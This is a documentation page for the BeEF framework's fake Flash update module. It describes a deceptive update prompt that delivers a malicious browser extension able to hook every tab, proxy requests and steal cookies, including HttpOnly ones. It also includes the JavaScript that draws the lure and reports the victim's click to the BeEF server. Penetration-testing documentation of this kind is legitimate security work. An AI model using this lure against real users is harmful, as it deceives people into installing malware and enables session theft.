##Summary

* **Description**: 
   * Prompts the user to install an update to Adobe Flash Player.The file to be delivered could be a Chrome or Firefox extension. 
   * A Chrome extension has privileged access and can do a whole lot.. 
       * Access all tabs and inject beef into all tabs
       * Use hooked browser as a proxy to do cross domain requests
       * Get all cookies including HTTPonly cookies
    * _Note_ : the Chrome extension delivery will work on Chrome <= 20. From Chrome 21 things changed in terms of how extensions can be loaded.
     * The Firefox extension is disabling PortBanning (ports 20,21,22,25,110,143), enabling Java, overriding the UserAgent and the default home/new_tab pages. See extensions/ipec/files/LinkTargetFinder dirrectory for the Firefox extension source.
* **Authors**: mh, antisnatchor
* **Browsers**: All (User is notified)
* **Parameters** :
  * **Splash Image** : Main image used for fake message (default is adobe reader logo)
  * **BeEF payload root path** : URL of the BeEF server should be here
  * **Payload** : Choose the payload (Chrome or Firefox)
* [Code](https://github.com/beefproject/beef/tree/master/modules/social_engineering/fake_flash_update)

##Internal Working

This module basically add a fake message in the center of the screen and redirect to the browser extension when the user clicks on it :

```javascript
var div = document.createElement('div');
div.setAttribute('id', 'splash');
div.setAttribute('style', 'position:absolute; top:30%; left:40%;');
div.setAttribute('align', 'center');
document.body.appendChild(div);
div.innerHTML= '<a href=\'' + payload + '\' ><img src=\''+ image +'\' /></a>';
    $j("#splash").click(function () {
      $j(this).hide();
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer=user has accepted');
    });
````

## Screenshots

_Command_ :
[[Images/module-fake-flash-update1.png|align=center]]

_Fake message_ :
[[Images/module-fake-flash-update2.png|align=center]]

_Error with Chrome  > 20_ :
[[Images/chrome-extensions.png|align=center]]

_Alert message on Firefox 17_ :
[[Images/module-fake-flash-update3.png|align=center]]

## Feedback

* Blocked with recent version of Chrome (> 20)
* It would be usefull to automatically detect if the browser is chrome or firefox and remove the payload option

## References

* [Adding extensions from other websites ](http://support.google.com/chrome_webstore/bin/answer.py?hl=en&answer=2664769&p=crx_warning)
